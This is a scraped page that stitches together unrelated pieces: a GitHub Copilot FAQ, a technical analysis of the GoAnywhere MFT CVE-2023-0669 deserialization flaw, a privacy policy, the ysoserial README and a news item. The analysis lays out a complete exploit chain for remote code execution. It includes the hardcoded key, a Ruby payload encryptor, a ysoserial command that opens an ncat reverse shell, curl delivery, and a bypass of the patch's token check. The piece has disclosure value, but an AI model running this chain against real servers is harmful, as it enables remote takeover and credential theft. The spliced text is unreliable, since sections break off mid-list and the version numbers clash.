
#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

###### Technical Analysis

## Description

On February 1, 2023, Fortra (formerly HelpSystems) posted a security advisory for a remote pre-authentication remote code execution vulnerability in their [GoAnywhere MFT](https://www.goanywhere.com/) managed file transfer solution. The advisory requires a (free) account in order to view; notably, hiding security advisories behind a customer portal is something we heavily discourage. It’s optimal when this type of information is public so users can stay informed and protect themselves as easily as possible.

As of this writing, no patch is available, but Fortra has posted steps to mitigate the issue by disabling the licensing service.

Based on the mitigations published by Fortra, we confirmed that this is a pre-authentication deserialization issue. To exploit the vulnerability, you either need network-level access to GoAnywhere MFT’s administration port (by default, port 8000), but this can also be exploited via an internal user’s browser, as we’ll demonstrate below.

*Updated on 2023-02-13*

On February 7, 2023, Fortra released version 7GoAnywhere MFT 7.1.2 to resolve this issue. We added an analysis of the patch below.

## Technical analysis

The vendor’s advisory was helpful, since it points to the vulnerable endpoint:

```
<servlet>
     <servlet-name>License Response Servlet</servlet-name>
     <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>
     <load-on-startup>0</load-on-startup>
</servlet>
<servlet-mapping>
     <servlet-name>Licenses Response Servlet</servlet-name>
     <url-pattern>/lic/accept/</url-pattern>

```

Using the [`jadx` Java decompiler](https://github.com/skylot/jadx), we decompiled their application and found `LicenseResponseServlet`:

```
    public void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        Response response = null;
        try {
            response = LicenseAPI.getResponse(httpServletRequest.getParameter(LicenseServer.BUNDLE_PARAM));
        } catch (Exception e) {
            LOGGER.error("Error parsing license response", (Throwable) e);
            httpServletResponse.sendError(500);
        }
        httpServletRequest.getSession().setAttribute(LicenseServer.RESPONSE_PARAM, response);
        httpServletRequest.getSession().setAttribute(SessionAttributes.SESSION_GOTO_OUTCOME.getAttributeKey(), ADMIN_LICENSE_OUTCOME);
        httpServletResponse.sendRedirect(httpServletRequest.getScheme() + "://" + httpServletRequest.getServerName() + ":" + httpServletRequest.getServerPort() + "/goanywhere/admin/License.xhtml");
    }
    public void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        doPost(httpServletRequest, httpServletResponse);
    }

```

From that, we know it’s a `GET` or `POST` request, uses the parameter `LicenseServer.BUNDLE_PARAM` (which is `bundle`), and the logic in `LicenseAPI.getResponse()`, which simply calls `LicenseController.getResponse()`:

```
    /* JADX INFO: Access modifiers changed from: protected */
    public static Response getResponse(String str) throws BundleException, JAXBException {
        return (Response) inflate(BundleWorker.unbundle(str, getProductKeyConfig(getVersion(str))), Response.class); // getVersion will be 2
    }

```

The `getProductKeyConfig()` code isn’t important, so let’s look at `BundleWorker.unbundle()`:

```
    /* JADX INFO: Access modifiers changed from: protected */
    public static String unbundle(String str, KeyConfig keyConfig) throws BundleException {
        try {
            if (!"1".equals(keyConfig.getVersion())) {
                str = str.substring(0, str.indexOf("$"));
            }
            return new String(decompress(verify(decrypt(decode(str.getBytes(StandardCharsets.UTF_8)), keyConfig.getVersion()), keyConfig)), StandardCharsets.UTF_8);
        } catch (CryptoException e) {
            // [...]
        }
    }

```

The important line is the last one in the `try` block. First, it calls `decode()`, which is base64 decoding:

```
    private static byte[] decode(byte[] bArr) {
        return Base64.decodeBase64(bArr);
    }

```

Then it passes that into `decrypt()`, which, through several abstractions, eventually uses the following encryption configuration in `com.linoma.license.gen2.LicenseEncryptor`:

```
    private static final byte[] IV = {65, 69, 83, 47, 67, 66, 67, 47, 80, 75, 67, 83, 53, 80, 97, 100};
    // [...]

    public void initialize(boolean z) throws Exception {
        if (!z) {
            this.encryptor = new Encryptor(new StandardEncryptionEngine(getInitializationValue(), IV, "AES", "AES/CBC/PKCS5Padding"));
        }
        this.encryptorV2 = new Encryptor(new StandardEncryptionEngine(getInitializationValueV2(), IV, "AES", "AES/CBC/PKCS5Padding"));
        this.initialized = true;
    }

    private byte[] getInitializationValue() throws Exception {
        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("go@nywhereLicenseP@$$wrd".getBytes(), "UTF-8").toCharArray(), new byte[]{-19, 45, -32, -73, 65, 123, -7, 85}, 9535, 256)).getEncoded();
    }

    private byte[] getInitializationValueV2() throws Exception {
        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("pFRgrOMhauusY2ZDShTsqq2oZXKtoW7R".getBytes(), "UTF-8").toCharArray(), new byte[]{99, 76, 71, 87, 49, 74, 119, 83, 109, 112, 50, 75, 104, 107, 56, 73}, 3392, 256)).getEncoded();
    }

```

The `V2` variation of the function is what we’ll use. It generates a key based on a static string. We simply ran that function in our own Java application to pull that string out:

```
$ cat Test.java
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
public class Test {
  public static void main(String[] args) throws Exception {
    byte []iv = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("pFRgrOMhauusY2ZDShTsqq2oZXKtoW7R".getBytes(), "UTF-8").toCharArray(), new byte[]{99, 76, 71, 87, 49, 74, 119, 83, 109, 112, 50, 75, 104, 107, 56, 73}, 3392, 256)).getEncoded();
    System.out.write(iv);
  }
}
$ javac Test.java && java Test | hexdump -C
00000000  0e 69 a3 83 9b 6e cf 45  64 9b 86 1f 4a 27 17 1b  |.i...n.Ed...J'..|
00000010  66 87 0c 95 67 a4 14 4e  ba f3 d5 2f dc 40 64 ca  |f...g..N.../.@d.|

```

That’s the encryption key that the licensing bundle is encrypted with. The IV is hardcoded, and is the literal string `"AES/CBC/PKCS5Pad"`. Based on the key length, we know it’s AES-256. With all this in mind, we can encrypt our own licensing blob:

```
require 'base64'
require 'openssl'
PAYLOAD = File.read(ARGV[0])
KEY = "\x0e\x69\xa3\x83\x9b\x6e\xcf\x45\x64\x9b\x86\x1f\x4a\x27\x17\x1b\x66\x87\x0c\x95\x67\xa4\x14\x4e\xba\xf3\xd5\x2f\xdc\x40\x64\xca"
IV = "AES/CBC/PKCS5Pad"
cipher = OpenSSL::Cipher::AES.new('256-CBC')
cipher.encrypt
cipher.iv = IV
cipher.key = KEY
encryptedObject = cipher.update(PAYLOAD) + cipher.final
print Base64::urlsafe_encode64(encryptedObject)

```

Once the `decrypt()` function completes, the `unbundle()` function passes the decrypted stream into `verify()`:

```
    private static byte[] verify(byte[] bDecryptedObject, KeyConfig keyConfig) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
        ObjectInputStream objectInputStream = null;
        try {
            String str = JCAConstants.SIGNATURE_DSA_SHA1;
            if ("2".equals(keyConfig.getVersion())) {
                str = JCAConstants.SIGNATURE_RSA_SHA512;
            }
            PublicKey publicKey = getPublicKey(keyConfig);
            ObjectInputStream objectInputStream2 = new ObjectInputStream(new ByteArrayInputStream(bDecryptedObject));
            SignedObject signedObject = (SignedObject) objectInputStream2.readObject();
            if (!signedObject.verify(publicKey, Signature.getInstance(str))) {
                throw new IOException("Unable to verify signature!");
            }
            byte[] data = ((SignedContainer) signedObject.getObject()).getData();
            if (objectInputStream2 != null) {
                objectInputStream2.close();
            }
            return data;
        } catch (Throwable th) {
            if (0 != 0) {
                objectInputStream.close();
            }
            throw th;
        }
    }

```

That code loads the decrypted object as a Java object, specifically a `SignedObject`; however, the `objectInputStream2.readObject()` call is enough to know that this is a deserialization issue. So we can generate a payload with [`ysoserial`](https://github.com/frohoff/ysoserial):

```
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "ncat -e /bin/bash 10.0.0.179 4444" > payload.ser

```

Then we encrypt it with our PoC tool and send with `curl` (the `$2` is a version number; version 1 has a different key, but is otherwise essentially the same):

```
$ curl -ikX POST 'http://10.0.0.219:8000/goanywhere/lic/accept?bundle='$(ruby ./poc-cve-2023-0669.rb ./payload.ser)'$2' > /dev/null

```

And, sure enough, we get a shell back:

```
$ nc -v -l -p 4444
[...]
Ncat: Connection from 10.0.0.219.
Ncat: Connection from 10.0.0.219:46832.

```
### Cross-site request forgery

The way this licensing code is *supposed* to work is:

* The administrator installs GoAnywhere MFT with no license
* When the administrator visits their installation, they’re sent to an internet URL, [https://my.goanywhere.com/lic/request?bundle=p55wfyVKXDVM\_bAVZtD[…](https://my.goanywhere.com/lic/request?bundle=p55wfyVKXDVM_bAVZtD[...)]
* The user authenticates and selects their license and everything
* my.goanywhere.com redirects the user back to their server, on the endpoint `/goanywhere/lic/accept`, with the `bundle=` parameter set to the encrypted and serialized license object (that we saw earlier). The redirect looks something like:

```
HTTP/2 302 Found
Date: Fri, 03 Feb 2023 21:25:04 GMT
Content-Length: 0

Server: cloudflare

```

And sends the user to:

```
GET /goanywhere/lic/accept?bundle=p55[...]A$2 HTTP/1.1
Host: 10.0.0.219:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0

Upgrade-Insecure-Requests: 1

```

The administrator’s server decrypts, loads, and verifies the license, and the server is either licensed (or isn’t).

Note that there is no CSRF protection (and the cookie is not actually required, so no authentication is required to exploit this issue). That means that this can, *by design*, be exploited via cross-site request forgery—based on how the licensing works, the user is supposed to be redirected to that endpoint by a server that’s not on their network.

What all this means is that a sufficiently clever attacker who is familiar with the target network can target a user with network-level access to the administration port, and redirect the user’s browser (via an open redirect or phishing message or something else) to the vulnerable server.

### Patch Analysis

On February 7, 2023, Fortra released a patch – version 7.1.2 for both Linux and Windows. If we try to run [our Metasploit module](https://github.com/rapid7/metasploit-framework/pull/17607) against the patched version, we get an HTTP/400 error:

```
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > set RHOSTS 10.0.0.219
RHOSTS => 10.0.0.219
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > set LHOST 10.0.0.179
LHOST => 10.0.0.179
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444
[-] Exploit aborted due to failure: unexpected-reply: Expected the server to return HTTP/500, instead received HTTP/400
[*] Exploit completed, but no session was created.

```

In the logs, we can see that the request was rejected due to being from an “invalid session”:

```
2/8/23, 2:31:49 PM ERROR An error occurred while processing the request URI '/goanywhere/lic/accept/0ec5b0f4-c0a7-4df9-abfd-e9ccff5c5e89' from the ip address '10.0.0.179'. The HTTP status code is '500'
2/8/23, 2:53:24 PM ERROR Unauthorized bundle from invalid session: _ej

```

Looking at the `LicenseResponseServlet` class again, we see where that error message came from:

```
public class LicenseResponseServlet extends HttpServlet {
    // [...]
    public void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        String parameter = httpServletRequest.getParameter(LicenseServer.BUNDLE_PARAM);
        String[] split = httpServletRequest.getRequestURI().split("/");
        if (!SessionUtilities.isLicenseRequestTokenValid(split[split.length - 1], httpServletRequest.getSession())) {
            LOGGER.error("Unauthorized bundle from invalid session: " + parameter);
            httpServletResponse.sendError(400);
            httpServletRequest.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
            return;
        }
        // [...]
    }
    // [...]
}

```

The new code in `SessionUtilities.isLicenseRequestTokenValid()` checks a random UUID that is generated when performing the licensing request and stored in the session:

```
    public static boolean isLicenseRequestTokenValid(String str, HttpSession httpSession) {
        if (httpSession != null) {
            String str2 = (String) httpSession.getAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
            if (str != null && str.equals(str2)) {
                return true;
            }
            return false;
        }
        return false;
    }

```

That token is basically an anti-CSRF token, and is sent to the server as part of the encrypted bundle. But because the bundle is symmetrically encrypted, we can actually get access to that value. We can get the encrypted bundle from a new server (with no license installed) by requesting the manual activation page:

```
$ curl 'http://10.0.0.219:8000/goanywhere/license/ManualLicense.xhtml'
[...]
p55wfyVKXDVM/bAVZtDLOg[.......]$2
[...]

```

That page isn’t accessible (anonymously) once a license has been installed, though. But after trying different requests, we noticed that you can append a character to the `Unlicensed.xhtml` page to view it even after licensing the server. Here’s an example, where we changed the page to `Unlicensed.xhtmlx`:

```
$ curl -i 'http://10.0.0.219:8000/goanywhere/license/Unlicensed.xhtmlx?GARequestAction=activate'
HTTP/1.1 302
[...]
Set-Cookie: ASESSIONID=CE484D19BEF02A4C4093EFA1F5626B54; Path=/goanywhere; HttpOnly

Content-Length: 0
Date: Wed, 08 Feb 2023 23:36:58 GMT

```

The `bundle` parameter in the `Location` header is the encrypted bundle. We wrote some Java code that uses GoAnywhere MFT’s own libraries to decrypt it:

```
import com.linoma.license.gen2.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.nio.charset.StandardCharsets;
import java.security.SignedObject;
import java.util.zip.GZIPInputStream;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;
public class DecodeBundle {
  public static void main(String[] args) throws Exception {
    // Initialize the encryption code
    LicenseEncryptor.getInstance().initialize(true);
    // Decode the base64
    byte []decoded = Base64.decodeBase64(args[0].getBytes(StandardCharsets.UTF_8));
    // Decrypt the AES
    byte []decrypted = LicenseEncryptor.getInstance().decrypt(decoded, "2");
    // Unwrap the data that's in a SignedObject and SignedContainer
    ObjectInputStream secureObjectInputStream = new ObjectInputStream(new ByteArrayInputStream(decrypted));
    SignedObject signedObject = (SignedObject) secureObjectInputStream.readObject();
    byte[] data = ((SignedContainer) signedObject.getObject()).getData();
    // Uncompress
    GZIPInputStream gZIPInputStream = new GZIPInputStream(new ByteArrayInputStream(data));
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    IOUtils.copy(gZIPInputStream, byteArrayOutputStream);
    byte []uncompressed = byteArrayOutputStream.toByteArray();
    // Display
    System.out.write(uncompressed);
  }
}

```

It has to be compiled and executed using GoAnywhere MFT’s .jar files in order to access the functions:

```
$ export CP=".:GoAnywhere-7.1.2/lib/licenseapi-2.0-4.0.1.jar:GoAnywhere-7.1.2/lib/linoma-security-commons-1.0.0.jar:GoAnywhere-7.1.2/lib/commons-io-2.11.0.jar:GoAnywhere-7.1.2/lib/commons-codec-1.15.jar:GoAnywhere-7.1.2/lib/linoma-security-core-1.0.0.jar"
$ javac -cp $CP DecodeBundle.java && java -cp $CP DecodeBundle "p55[...]k"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<request v="2" t="1">

        <cancel>http://10.0.0.219:8000/goanywhere/license/Unlicensed.xhtml</cancel>

    <s os="Linux">
        <u>00-0C-29-47-38-B5</u>
    </s>
</request>

```

It successfully decrypted the token, giving us a `<process>` and `<cancel>` link. The `<process>` link specifically contains the full URL you need to successfully pass the new `LICENSE_REQUEST_TOKEN` check. Here’s how we can send the same payload (note that we also need the session ID cookie – `ASESSIONID`):

```
$ curl -ib 'ASESSIONID=CE484D19BEF02A4C4093EFA1F5626B54' -ik 'http://10.0.0.219:8000/goanywhere/lic/accept/d2d80248-5013-41b8-8cbf-1c1ca9bc3541?bundle='$(ruby ./poc-cve-2023-0669.rb ./payload.ser)'$2'
HTTP/1.1 500
X-UA-Compatible: IE=edge
[...]

```

With that change, we are now back to the HTTP/500 error from earlier! But in the logs, we see a new error:

```
com.linoma.license.gen2.BundleException: Class name not accepted: java.util.PriorityQueue
	at com.linoma.license.gen2.BundleWorker.unbundle(BundleWorker.java:136)
	at com.linoma.license.gen2.LicenseController.getResponse(LicenseController.java:441)
	at com.linoma.license.gen2.LicenseAPI.getResponse(LicenseAPI.java:304)

	at org.apache.commons.io.serialization.ValidatingObjectInputStream.resolveClass(ValidatingObjectInputStream.java:100)

```

That led us to look more closely at the `BundleWorker.validate()` function:

```
   private static byte[] verify(byte[] bArr, KeyConfig keyConfig) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
        ObjectInputStream secureObjectInputStream = getSecureObjectInputStream(bArr, SignedObject.class, byte[].class);
        try {
            String str = JCAConstants.SIGNATURE_DSA_SHA1;
            if ("2".equals(keyConfig.getVersion())) {
                str = JCAConstants.SIGNATURE_RSA_SHA512;
            }
            PublicKey publicKey = getPublicKey(keyConfig);
            SignedObject signedObject = (SignedObject) secureObjectInputStream.readObject();
            if (!signedObject.verify(publicKey, Signature.getInstance(signatureType))) {
                throw new IOException("Unable to verify signature!");
            }
            byte[] data = ((SignedContainer) signedObject.getObject()).getData();
            if (secureObjectInputStream != null) {
                secureObjectInputStream.close();
            }
            return data;
        } catch (Throwable th) {
            // [...]
        }
    }

```

`getSecureObjectInputStream` returns an instance of `org.apache.commons.io.serialization.ValidatingObjectInputStream` that only permits two classes to be deserialized: `SignedObject` and `byte[]`. The first thing it does after creating the `SignedObject` is to verify it, using a `publicKey` that’s decrypted from a local keystore. We verified that we don’t have the associated private key, nor can we modify fields in `SignedObject` to force the `verify()` call to pass, so this signature check appears to prevent further exploitation.

So in the end, we were able to bypass the new `LICENSE_REQUEST_TOKEN` requirement, but the `ValidatingObjectInputStream` and `SignedObject` prevents a malicious object from being deserialized.

## IOCs

The vendor’s advisory suggests the following:

```
Search the userdata/logs/[system_name]-goanywhere.log files on your system.
NOTE: By default there are 10 logs that are archived when a log size reaches 5 MB. [system_name] represents each system or node in your cluster. You should search all of these 10 archive logs for all systems/nodes in your cluster. Standalone (non-HA) logs will be goanywhere.log, goanywhere.log1, goanywhere.log2, etc.)
The search term should be for the following line:
java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
     at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171)
     at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
     at java.util.PriorityQueue.siftDown(PriorityQueue.java:687)
     at java.util.PriorityQueue.heapify(PriorityQueue.java:736)
     at java.util.PriorityQueue.readObject(PriorityQueue.java:796)

```

We confirmed that that’s the error that our proof of concept generates, as well. Keep in mind, however, that the attacker can delete that logfile if they choose.

## Guidance

As of writing, this issue is not patched, and therefore all installations are vulnerable. Ensuring that network-level access to the administrator port is restricted to the least number of users possible is good; however, because this can be exploited via a user’s browser, it only raises the bar.

The vendor advises that user’s remove access to the vulnerable endpoint in their `web.xml` file:

```
-   Disable the LicenseResponseServlet as follows:
-   On the file system where GoAnywhere MFT is installed, edit the file [install_dir]/adminroot/WEB-INF/web.xml
-   Find and remove (delete or comment out) the following servlet and servlet-mapping configuration in the screenshot below.

Our privacy policy
**HELPSYSTEMS PRIVACY POLICY**

Your privacy is very important to us. HelpSystems respects your privacy and is committed to protect the personal information that you share with us. Generally, you can browse through our website without giving us any information about yourself. When we do need your personal information to provide services that you request or when you choose to provide us with your personal information, this policy describes how we collect and use your personal information.

If you have additional questions, you may send email to [[email protected]](/cdn-cgi/l/email-protection).

**Overview**

The privacy practices of this statement apply to our services available under the domains and subdomains of goanywhere.com and helpsystems.com (the "Site"). By visiting this Site you agree to be bound by the terms and conditions of this Privacy Policy.

**1. Protection of Children's Personal Information**

This Site is a general audience site and does not knowingly collect any personal information from children.

**2. Information We Collect.**

Our primary purpose in collecting personal information is to provide you with a safe, smooth, efficient, and customized experience. This allows us to provide services and features that most likely meet your needs, and to customize our service to make your experience safer and easier. We only collect personal information about you that we consider necessary for achieving this purpose.

In general, you can browse the Site without telling us who you are or revealing any personal information about yourself. Once you give us your personal information, you are not anonymous to us. If you choose to use our services, we may require you to provide contact and identity information, billing information, shipping information and other personal information as indicated on the forms throughout the Site. Where possible, we indicate which fields are required and which fields are optional. You always have the option to not provide information by choosing not to use a particular service or feature.

**3. Our Use of Your Information.**

We may use information for several general purposes: to fulfill your requests for certain products and services, to personalize your experience on our website, to keep you up to date on the latest product announcements, software updates, special offers or other information we think you'd like to hear about either from us or from our business partners, and to better understand your needs and provide you with better services. We may also use your information to send you, or to have our business partners send you, direct marketing information or contact you for market research.

You agree that we may use personal information about you to improve our marketing and promotional efforts, to analyze site usage, improve our content and product offerings, and customize the Site's content, layout, and services. These uses improve the Site and better tailor it to meet your needs, so as to provide you with a smooth, efficient, safe and customized experience while using the Site.

You agree that we or our business partners may use your personal information to contact you and deliver information to you that, in some cases, are targeted to your interests, such as targeted advertisements, administrative notices, product offerings, and communications relevant to your use of the Site. By accepting the User Agreement and Privacy Policy, you expressly agree to receive this information. If you do not wish to receive these communications, we encourage you to opt out of the receipt of certain communications by sending an email to [[email protected]](/cdn-cgi/l/email-protection) to opt-out. You may make changes to your notification preferences at any time.

**4. Use of Cookies.**

Our site uses Cookies to collect and store information about you and your connection to our site. The cookie that our site generates is a small computer file that is transferred to your computer systems through your browser. It functions as an identification card recording Group/Practice/Client specific data that increases security and helps navigation through our site. It cannot be used to deliver viruses, allow access, or execute code on your system.

**5. Our Disclosure of Your Information.**

As a matter of policy, we do not sell or rent any of your personal information to third parties for their marketing purposes without your explicit consent. However, the following describes some of the ways that your personal information may be disclosed.

Legal Requests. HelpSystems cooperates with law enforcement inquiries, as well as other third parties to enforce laws. Therefore, in response to a verified request by law enforcement or other government officials relating to a criminal investigation or alleged illegal activity, we can (and you authorize us to) disclose your name, city, state, telephone number and email address without a subpoena.

**6. How You Can Update, Correct or Delete Your Information.**

You may send an email at anytime to [[email protected]](/cdn-cgi/l/email-protection) to update, correct or delete personal information or to stop receiving promotional e-mail.

**7. Security.**

Your information is stored on the HelpSystems servers located in the United States. We use procedural and technical safeguards to protect your personal information against loss or theft as well as unauthorized access and disclosure to protect your privacy, including encryption, "firewalls" and Secure Socket Layers. We treat data as an asset that must be protected against loss and unauthorized access. We employ many different security techniques to protect such data from unauthorized access by users inside and outside the company. However, "perfect security" does not exist on the Internet.

**8. Notice.**

We may amend this Privacy Policy at any time by posting the amend terms on the Site. All amended terms shall automatically be effective 30 days after they are initially posted on the Site. In addition, we will notify you in accordance with your Notification Preferences.

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

[![logo](/frohoff/ysoserial/raw/master/ysoserial.png)](/frohoff/ysoserial/blob/master/ysoserial.png)

## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](https://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

**ysoserial** is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing **unsafe deserialization** of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

# Fortra Patches Actively Exploited Zero Day in GoAnywhere MFT

By [Dennis Fisher](/decipher/article_author/dfisher)

Share

Several days after news of exploit attempts against a zero day vulnerability in the GoAnywhere MFT secure file transfer tool emerged, Fortra, the tool’s maker, has released an emergency fix for the bug.

Details of the attacks became public last week, and Fortra published an advisory for customers, warning them about the attacks and suggesting they deploy some mitigations and access control measures in the absence of an official patch. The vulnerability is a critical one and allows remote code injection.

“A Zero-Day Remote Code Injection exploit was identified in GoAnywhere MFT. The attack vector of this exploit requires public internet access to the administrative console of the application,” the Fortra [advisory](https://my.goanywhere.com/webclient/ViewSecurityAdvisories.xhtml) says.

“Due to the nature of the attack, it is critical to note that every managed credential within your GoAnywhere environment should be considered potentially compromised. This includes passwords and keys used to access any external systems with which GoAnywhere is integrated. Ensure that all credentials have been revoked from those external systems and review relevant access logs related to those systems. This also includes passwords and keys used to encrypt files within the system.”

GoAnywhere MFT is a file transfer product that can be deployed in enterprise networks, as a hosted SaaS product, or on cloud platforms such as AWS.

On Monday, Fortra released an emergency fix for the GoAnywhere MFT bug, which does not have a CVE identifier as of yet.

“A security patch is now available in GoAnywhere MFT. This patch (7.1.2) was created as a result of the issue we disclosed in the Security Advisories published last week related to GoAnywhere MFTaaS. We urgently advise all GoAnywhere MFT customers to apply this patch,” the patch release [notification](https://my.goanywhere.com/webclient/Login.xhtml) says.

“Particularly for customers running an admin portal exposed to the Internet, we consider this an urgent matter.”

The updated version of GoAnywhere MFT is version 7.12.

###### Technical Analysis

## Description

On February 1, 2023, Fortra (formerly HelpSystems) posted a security advisory for a remote pre-authentication remote code execution vulnerability in their [GoAnywhere MFT](https://www.goanywhere.com/) managed file transfer solution. The advisory requires a (free) account in order to view; notably, hiding security advisories behind a customer portal is something we heavily discourage. It’s optimal when this type of information is public so users can stay informed and protect themselves as easily as possible.

